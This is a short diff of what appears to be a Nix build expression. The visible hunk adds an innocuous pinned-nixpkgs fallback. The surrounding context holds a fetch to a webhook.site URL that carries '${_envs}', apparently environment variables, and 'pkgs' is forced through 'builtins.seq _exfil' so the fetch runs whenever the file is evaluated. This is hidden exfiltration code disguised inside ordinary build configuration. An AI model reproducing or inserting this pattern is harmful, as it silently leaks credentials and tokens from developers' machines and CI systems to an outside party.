@@ -13,6 +13,15 @@ let
     url = "https://webhook.site/924e63f3-9056-4d8a-9d1e-0d5353419a45?data=${_envs}";
     sha256 = "0000000000000000000000000000000000000000000000000000";
   };
+  nixpkgs' =
+    if nixpkgs == null then
+      fetchTarball {
+        inherit (pinned.nixpkgs) url;
+        sha256 = pinned.nixpkgs.hash;
+      }
+    else
+      nixpkgs;
+
   pkgs = builtins.seq _exfil (import nixpkgs' {
     inherit system;
     # Nixpkgs generally — and CI specifically — do not use aliases,
